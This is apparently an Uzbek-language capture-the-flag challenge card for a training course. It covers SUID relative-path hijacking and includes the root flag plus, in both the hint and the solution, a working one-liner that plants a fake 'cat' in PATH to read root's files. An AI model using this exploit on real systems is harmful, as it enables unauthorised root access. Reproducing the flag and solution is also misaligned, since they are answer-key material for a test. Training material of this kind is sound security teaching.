---
id: 11
title: "CH11: SUID Relative Path Hijacking"
module: "Modul 2: PrivEsc & Binary Exploitation"
difficulty: Hard
points: 8
tags: ['suid', 'path-hijacking', 'privesc', 'root']
flag: "HD{suid_relative_path_hijack_root_911}"
---

# 🎯 Topshiriq #11: CH11: SUID Relative Path Hijacking

## 📌 Metama'lumotlar:
* **Modul:** `Modul 2: PrivEsc & Binary Exploitation`
* **Qiyinlik darajasi:** `🔴 Hard`
* **Maksimal Ball:** `⭐ 8 ball`
* **Teglar:** #suid, #path-hijacking, #privesc, #root

---

## 📝 Topshiriq Senariysi (Scenario):
/usr/local/bin/system_catalog SUID binary ichida '/bin/cat' o'rniga shunchaki 'cat' buyrug'ini chaqiradi. PATH Hijacking orqali root imtiyozida ixtiyoriy buyruq bajaring.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> echo -e '#!/bin/sh\ncat /root/flag.txt' > cat && chmod +x cat && export PATH=.:$PATH && /usr/local/bin/system_catalog

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
echo -e '#!/bin/sh\ncat /root/flag.txt' > cat && chmod +x cat && export PATH=.:$PATH && /usr/local/bin/system_catalog
```

---

## 🚩 Maxfiy Flag:
`HD{suid_relative_path_hijack_root_911}`
